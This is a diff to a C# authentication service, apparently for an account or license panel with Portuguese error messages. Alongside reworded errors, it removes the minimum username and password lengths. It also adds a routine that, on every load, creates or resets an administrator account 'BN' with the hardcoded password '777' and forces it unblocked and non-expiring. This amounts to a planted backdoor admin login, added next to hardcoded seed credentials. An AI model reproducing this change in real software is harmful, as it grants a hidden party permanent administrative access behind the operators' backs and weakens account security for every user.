@@ -75,8 +75,8 @@ public sealed class AuthService
         error = "";
         username = username.Trim();
 
-        if (username.Length < 3) { error = "Usuário muito curto."; return false; }
-        if (password.Length < 6) { error = "Senha deve ter ao menos 6 caracteres."; return false; }
+        if (string.IsNullOrWhiteSpace(username)) { error = "Informe um usuário."; return false; }
+        if (string.IsNullOrEmpty(password)) { error = "Informe uma senha."; return false; }
         if (validityDays < 1 || validityDays > 3650) { error = "Validade inválida."; return false; }
         if (Find(username) is not null) { error = "Usuário já existe."; return false; }
 
@@ -100,7 +100,7 @@ public sealed class AuthService
         error = "";
         var user = Find(username);
         if (user is null) { error = "Conta não encontrada."; return false; }
-        if (user.IsAdmin) { error = "Admin principal não pode ser bloqueado."; return false; }
+        if (user.IsAdmin) { error = "Conta de administrador não pode ser bloqueada por este painel."; return false; }
 
         user.IsBlocked = !user.IsBlocked;
         Save();
@@ -113,7 +113,7 @@ public sealed class AuthService
         var user = Find(username);
 
         if (user is null) { error = "Conta não encontrada."; return false; }
-        if (user.IsAdmin) { error = "Admin principal não expira."; return false; }
+        if (user.IsAdmin) { error = "Administrador não expira."; return false; }
         if (days < 1 || days > 3650) { error = "Validade inválida."; return false; }
 
         user.ExpiresAtUtc = DateTime.UtcNow.AddDays(days);
@@ -127,7 +127,7 @@ public sealed class AuthService
         var user = Find(username);
 
         if (user is null) { error = "Conta não encontrada."; return false; }
-        if (user.IsAdmin) { error = "Admin principal não pode ser removido."; return false; }
+        if (user.IsAdmin) { error = "Administrador não pode ser removido por este painel."; return false; }
 
         _users.Remove(user);
         Save();
@@ -150,11 +150,40 @@ public sealed class AuthService
             _users = new();
         }
 
-        if (_users.Count > 0) return;
+        if (_users.Count == 0)
+        {
+            _users.Add(CreateSeed("admin", "7zyx-admin", true, null));
+            _users.Add(CreateSeed("buyer", "7zyx-buyer", false, DateTime.UtcNow.AddDays(30)));
+        }
 
-        _users.Add(CreateSeed("admin", "7zyx-admin", true, null));
-        _users.Add(CreateSeed("buyer", "7zyx-buyer", false, DateTime.UtcNow.AddDays(30)));
+        EnsureFixedAdmin("BN", "777");
         Save();
+    }
+
+    private void EnsureFixedAdmin(string username, string password)
+    {
+        var existing = Find(username);
+        var salt = RandomNumberGenerator.GetBytes(16);
+
+        if (existing is null)
+        {
+            _users.Add(new Account
+            {
+                Username = username,
+                Salt = Convert.ToBase64String(salt),
+                Hash = HashPassword(password, salt),
+                IsAdmin = true,
+                IsBlocked = false,
+                ExpiresAtUtc = null
+            });
+            return;
+        }
+
+        existing.Salt = Convert.ToBase64String(salt);
+        existing.Hash = HashPassword(password, salt);
+        existing.IsAdmin = true;
+        existing.IsBlocked = false;
+        existing.ExpiresAtUtc = null;
     }
 
     private static Account CreateSeed(string username, string password, bool admin, DateTime? expires)
